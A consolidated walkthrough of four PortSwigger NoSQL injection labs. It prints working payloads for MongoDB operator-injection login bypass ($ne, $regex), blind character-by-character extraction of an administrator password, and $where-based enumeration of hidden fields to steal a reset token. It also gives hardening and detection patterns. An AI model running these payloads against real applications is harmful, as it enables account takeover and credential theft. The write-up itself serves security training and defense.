# PortSwigger NoSQL Injection 1-4 — Query Shape Is the Boundary

This is a consolidated walkthrough of the four PortSwigger NoSQL Injection labs.

All labs were completed in the authorized Web Security Academy environment. The main lesson is that NoSQL injection often changes the query shape: strings become JavaScript expressions, scalar values become MongoDB operators, and hidden document fields become enumerable attack surface.

## 1. Overview

| # | Lab | Flaw | Core idea |
|---|-----|------|-----------|
| 1 | Detecting NoSQL injection | category is interpolated into a Mongo/JS condition | build true/false conditions and return unreleased products |
| 2 | Operator injection auth bypass | JSON login accepts MongoDB operators | use `$ne` and `$regex` to select administrator |
| 3 | Extract data | lookup parameter supports boolean JavaScript conditions | extract administrator password with `this.password` oracle |
| 4 | Extract unknown fields | `$where` allows JavaScript over the user object | enumerate `Object.keys(this)`, then extract reset token |

## 2. Triage model

There are two main patterns in this series:

String expression injection:

```text
Gifts' && 1 && 'x
Gifts'||1||'
```

Operator injection:

```json
{"username":{"$regex":"admin.*"},"password":{"$ne":""}}
```

If `$where` is accepted, JavaScript becomes a powerful boolean oracle:

```json
{"$where":"this.password[0]=='a'"}
```

## 3. Detection and authentication bypass

The category filter lab confirms injection with a syntax error, then with different true/false responses:

```text
category=Gifts' && 0 && 'x
category=Gifts' && 1 && 'x
```

An always-true condition returns unreleased products:

```text
category=Gifts'||1||'
```

The login lab accepts objects where strings are expected:

```json
{"username":{"$ne":""},"password":{"$ne":""}}
```

That matches too many users, so narrow the username:

```json
{"username":{"$regex":"admin.*"},"password":{"$ne":""}}
```

## 4. Blind extraction

The lookup lab exposes a boolean oracle through response differences:

```text
wiener' && '1'=='2
wiener' && '1'=='1
```

Password length:

```text
administrator' && this.password.length < 30 || 'a'=='b
```

Character extraction:

```text
administrator' && this.password[0]=='a
```

The unknown-field lab starts by proving `$where` execution:

```json
{"username":"carlos","password":{"$ne":"invalid"},"$where":"1"}
```

Then enumerate field names:

```json
{"$where":"Object.keys(this)[1].match('^.{0}u.*')"}
```

After discovering the password-reset token field, use the same regex oracle against `this.TOKEN_FIELD`, then submit the recovered token to the reset endpoint.

## 5. Defense and detection

Hardening:

- validate JSON schemas and reject objects in scalar fields;
- deny operator keys such as `$ne`, `$regex`, and `$where` in user-controlled JSON;
- construct Mongo queries from allowlisted fields only;
- do not merge raw user JSON into query objects;
- disable `$where` and server-side JavaScript;
- remove credential and reset-token fields from user-facing query surfaces;
- normalize login errors to reduce oracle differences.

Detection:

- `$ne`, `$regex`, `$where`, `Object.keys(this)`, or `this.password` in requests;
- `' &&`, `'||1||'`, `match('^`, or `charCodeAt` in query parameters;
- login JSON fields changing from strings to objects;
- high-volume character-position enumeration against lookup or login routes;
- reset endpoints probed with unusual field names.

No lab in this series required a Collaborator/OAST channel.
